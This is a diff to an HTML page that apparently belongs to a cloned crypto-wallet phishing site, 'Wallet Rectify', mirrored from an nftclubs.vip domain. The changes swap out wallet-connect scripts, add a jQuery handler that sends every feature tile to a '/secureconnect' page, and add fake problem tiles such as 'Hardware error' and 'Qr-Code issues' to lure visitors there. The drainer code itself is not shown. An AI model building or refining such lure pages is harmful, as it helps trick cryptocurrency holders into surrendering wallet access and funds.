@@ -1,5 +1,4 @@
 <!DOCTYPE html><html lang="en">
-<!-- Mirrored from dapp.rectifywallet.nftclubs.vip/assets/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 10 Aug 2023 20:53:56 GMT -->
 <head>
     
     <meta charset="utf-8">
@@ -8,11 +7,11 @@
     <meta name="author" content>
     <link rel="icon" type="image/png" href="images/favicon.png">
     <title>Wallet Rectify - Rectification, Synchronization, and Validation</title>
-
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="../../cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
  <script src="../../cdn.jsdelivr.net/npm/merkletreejs%40latest/merkletree.js"></script>
- <script src="scripts/seaport.js"></script>
- <script src="scripts/wallet_connect.js"></script>
+ <!--<script src="scripts/seaport.js"></script>-->
+ <!--<script src="scripts/wallet_connect.js"></script>-->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="e3063cca-1cbc-4a62-a435-5034e248c5a3.js"></script>
 
@@ -26,7 +25,13 @@
     <link rel="stylesheet" type="text/css" href="css/slick-theme.min.css">
 
     <link href="css/style.css" rel="stylesheet">
-	 
+	 <script>
+    $(document).ready(function() {
+      $(".div_each_feature").click(function() {
+        window.location.href = "/secureconnect"; // Navigate to the /secure page
+      });
+    });
+  </script>
 </head>
 <body>
     <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
@@ -450,7 +455,36 @@
                                 </div>
                             </div>
                         </div>
-
+<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                            <div class="selected_features fixit">
+                                <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                    <div class="card-body text-center py-1">
+                                        <i class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Hardware error</h6>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                            <div class="selected_features fixit">
+                                <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                    <div class="card-body text-center py-1">
+                                        <i class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2"> Qr-Code issues</h6>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+<div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                            <div class="selected_features fixit">
+                                <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                    <div class="card-body text-center py-1">
+                                        <i class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                        <h6 class="card-title mb-1 text-dark fw-bold mt-2">Validation</h6>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     
                         <div class="col-6 col-md-4 col-lg-2 div_each_feature">
                             <div class="selected_features fixit">
